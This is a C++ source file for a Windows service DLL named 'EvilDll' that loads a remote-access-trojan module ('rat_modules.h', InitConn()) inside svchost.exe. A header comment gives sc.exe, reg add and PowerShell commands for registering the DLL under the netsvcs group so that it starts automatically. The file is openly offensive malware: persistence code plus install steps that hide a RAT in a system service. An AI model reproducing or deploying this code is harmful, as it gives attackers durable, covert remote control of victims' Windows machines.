// dllmain.cpp : Defines the entry point for the DLL application.
//#include "pch.h"
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include "rat_modules.h"

#define SVCNAME TEXT("EvilDll")

SERVICE_STATUS serviceStatus;
SERVICE_STATUS_HANDLE serviceStatusHandle;
HANDLE stopEvent = NULL;

/*

--------------------------------
www.ired.team/offensive-security/persistence/persisting-in-svchost.exe-with-a-service-dll-servicemain

Installation commands.
    1- sc.exe create EvilSvc binPath= "c:\windows\System32\svchost.exe -k netsvcs" type= share start= auto
    2- reg add HKLM\SYSTEM\CurrentControlSet\services\EvilSvc\Parameters /v ServiceDll /t REG_EXPAND_SZ /d C:\Windows\system32\EvilSvc.dll /f 
    3- powershell -Command "$svchostPath = 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Svchost'; $currentValue = Get-ItemProperty -Path $svchostPath -Name 'netsvcs'; $newValue = $currentValue.netsvcs + @('EvilSvc'); Set-ItemProperty -Path $svchostPath -Name 'netsvcs' -Value $newValue"

* note EvilDLL must be in C:\Windows\system32\EvilDLL.dll like the path in command 2 
*/


VOID UpdateServiceStatus(DWORD currentState)
{
    serviceStatus.dwCurrentState = currentState;
    SetServiceStatus(serviceStatusHandle, &serviceStatus);
}

DWORD ServiceHandler(DWORD controlCode, DWORD eventType, LPVOID eventData, LPVOID context)
{
    switch (controlCode)
    {
    case SERVICE_CONTROL_STOP:
        serviceStatus.dwCurrentState = SERVICE_STOPPED;
        SetEvent(stopEvent);
        break;
    case SERVICE_CONTROL_SHUTDOWN:
        serviceStatus.dwCurrentState = SERVICE_STOPPED;
        SetEvent(stopEvent);
        break;
    case SERVICE_CONTROL_PAUSE:
        serviceStatus.dwCurrentState = SERVICE_PAUSED;
        break;
    case SERVICE_CONTROL_CONTINUE:
        serviceStatus.dwCurrentState = SERVICE_RUNNING;
        break;
    case SERVICE_CONTROL_INTERROGATE:
        break;
    default:
        break;
    }

    UpdateServiceStatus(SERVICE_RUNNING);

    return NO_ERROR;
}

VOID ExecuteServiceCode()
{
    stopEvent = CreateEvent(NULL, TRUE, FALSE, NULL);
    //OutputDebugStringA("Before UpdateServiceStatus()");
    UpdateServiceStatus(SERVICE_RUNNING);

    // #####################################
    // your persistence code here
    // #####################################
    //OutputDebugStringA("Before InitConn()");
    InitConn();

    while (1)
    {
        WaitForSingleObject(stopEvent, INFINITE);
        UpdateServiceStatus(SERVICE_STOPPED);
        return;
    }
}

__declspec(dllexport) VOID WINAPI ServiceMain(DWORD argC, LPWSTR* argV)
{
    serviceStatusHandle = RegisterServiceCtrlHandler(SVCNAME, (LPHANDLER_FUNCTION)ServiceHandler);

    serviceStatus.dwServiceType = SERVICE_WIN32_SHARE_PROCESS;
    serviceStatus.dwServiceSpecificExitCode = 0;

    UpdateServiceStatus(SERVICE_START_PENDING);
    ExecuteServiceCode();
}

